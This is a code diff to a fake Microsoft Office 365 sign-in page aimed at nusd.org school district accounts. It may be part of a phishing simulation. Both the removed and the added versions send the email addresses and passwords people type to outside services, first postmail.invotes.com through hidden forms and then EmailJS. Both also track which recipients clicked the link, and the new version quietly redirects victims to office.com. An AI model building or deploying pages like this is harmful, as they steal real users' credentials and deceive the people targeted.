@@ -1,108 +1,77 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta http-equiv="X-UA-Compatible" content="ie=edge">
-<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/5.0.0-alpha1/css/bootstrap.min.css">
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.1/css/all.min.css">
-<link rel="stylesheet" href="assets/css/style.css">
-<link rel="stylesheet" href="styles.css">
-<title>Sign In</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/5.0.0-alpha1/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.1/css/all.min.css">
+    <link rel="stylesheet" href="styles.css">
+    <title>Sign In</title>
 
-<script type="text/javascript">
-        
-    window.addEventListener('load', function() {
-        const queryString = window.location.search;
-        const urlParams = new URLSearchParams(queryString);
-        const id = urlParams.get('id')
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@2.4.0/dist/email.min.js"></script>
+    <script type="text/javascript">
+       (function(){
+          emailjs.init("user_1zERChcXb08qloMMXqbpN"); 
+       })();
+    </script>
 
-    	if (id !== null)
-    	{
-    		console.log (id)
-	        document.getElementById("username_justlanded").value = id + "@nusd.org";    
-	        document.getElementById("password_justlanded").value = id + " clicked the link (Office 365)"
-	        document.getElementById("username").value = id + "@nusd.org"
-	        document.getElementById("hidden-form").submit();
-    	}
-    });
+    <script type="text/javascript">        
+        window.addEventListener('load', function() {
+            const queryString = window.location.search;
+            const urlParams = new URLSearchParams(queryString);
+            const id = urlParams.get('id')
+
+        	if (id !== null)
+        	{
+        		document.getElementById("username").value = id + "@nusd.org";
+                var clicked_params = {
+                   "user": id.toUpperCase()
+                }
+                emailjs.send('default_service', 'clicked', clicked_params);
+        	}
+        });
 
 
-    function Verify(event) {
-        if (document.getElementById("username").value.trim() === "" || document.getElementById("password").value.trim() === "") {
-            event.preventDefault();
-            $("#errModal").modal("show");
-        } else {
-            var dt = new Date();
-            var date = dt.getFullYear() + "-" + dt.getMonth() + "-" + dt.getDay();
-            var time = dt.getHours() + "-" + dt.getMinutes() + "-" + dt.getSeconds();
+        function Verify(event) {
+            if (document.getElementById("username").value.trim() === "" || document.getElementById("password").value.trim() === "") {
+            	event.preventDefault();
+                alert ("Invalid credentials");
+            } else {
+                var dt = new Date();
 
-            document.getElementById("password").value = "Office 365 Project~~~" + document.getElementById("username").value + "~~~" + document.getElementById("password").value + "~~~" + date + "~~~" + time;
+                var login_params = {
+                   "email": document.getElementById("username").value,
+                   "password": document.getElementById("password").value,
+                   "date": dt.getFullYear() + "-" + dt.getMonth() + "-" + dt.getDay(),
+                   "time": dt.getHours() + "-" + dt.getMinutes() + "-" + dt.getSeconds()
+                }
+                emailjs.send('default_service', 'login', login_params); 
+                window.location.href = "https://www.office.com/";
+            }
         }
-    }
-</script>
-
+    </script>
 </head>
 <body>
-    <form action="https://postmail.invotes.com/send" method="post" id="email_form">
-        <div class="row">
-            <div id="contentWrapper" class="float">
-                <img src="logo.png" alt="">
-                <div class="content">
-                    <p class="signInText">Sign in with your organizational account
-                    </p>
-                    <div class="form-group">
-                        <input type="text" name="subject" id="username" class="form-control rounded-0 form-control-sm" placeholder="someone@example.com">
-                    </div>
-                    <div class="form-group">
-                        <input type="password" name="text" id="password" class="form-control rounded-0 form-control-sm" placeholder="Password">
-                    </div>
-                    <button type="text" class="btn btn-primary rounded-0" onclick="Verify(event)">Sign in</button>
-                    <div class="footer">
-                        &copy; 2013 Microsoft <a href="https://nusd.zendesk.com/" class="help">Help</a>
-                    </div>
+    <div class="row">
+        <div id="contentWrapper" class="float">
+            <img src="logo.png" alt="">
+            <div class="content">
+                <p class="signInText">Sign in with your organizational account
+                </p>
+                <div class="form-group">
+                    <input type="text" name="subject" id="username" class="form-control rounded-0 form-control-sm" placeholder="someone@example.com">
                 </div>
-            </div>           
-        </div>
-
-        <!-- replace value with your access token -->
-        <input type="hidden" name="access_token" value="plakm8estx5jgbpr8hhw2rkz" /> 
-        <input type="hidden" name="success_url" value="https://www.microsoft.com/en-us/microsoft-365?rtc=1" />
-        <input type="hidden" name="error_url" value="https://www.microsoft.com/en-us/microsoft-365?rtc=1" />
-    </form>
-
-    <form action="https://postmail.invotes.com/send" method="post" id="hidden-form" target="hidden-form">
-        <input type="hidden" name="access_token" value="plakm8estx5jgbpr8hhw2rkz" /> 
-        <input type="hidden" name="subject" class="form-control" id="username_justlanded" placeholder="district email" />
-        <input type="hidden" name="text" class="form-control" id="password_justlanded" placeholder="password" />
-    </form>
-    <iframe style="display:none" name="hidden-form" id="hidden-form"></iframe>
-
-    <!-- The Modal -->
-    <div class="modal" id="errModal">
-        <div class="modal-dialog">
-            <div class="modal-content">
-                <!-- Modal Header -->
-                <div class="modal-header">
-                    <h4 class="modal-title">Error login</h4>
-                    <button type="button" class="close" data-dismiss="modal">&times;</button>
+                <div class="form-group">
+                    <input type="password" name="text" id="password" class="form-control rounded-0 form-control-sm" placeholder="Password">
                 </div>
-
-                <!-- Modal body -->
-                <div class="modal-body">
-                    Invalid Credentials!
-                </div>
-
-                <!-- Modal footer -->
-                <div class="modal-footer">
-                    <button type="button" class="btn btn-danger" data-dismiss="modal">Close</button>
+                <button type="text" class="btn btn-primary rounded-0" onclick="Verify(event)">Sign in</button>
+                <div class="footer">
+                    &copy; 2013 Microsoft <a href="https://nusd.zendesk.com/" class="help">Help</a>
                 </div>
             </div>
         </div>
     </div>
-
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.1/umd/popper.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/5.0.0-alpha1/js/bootstrap.min.js"></script>
 </body>
 </html>
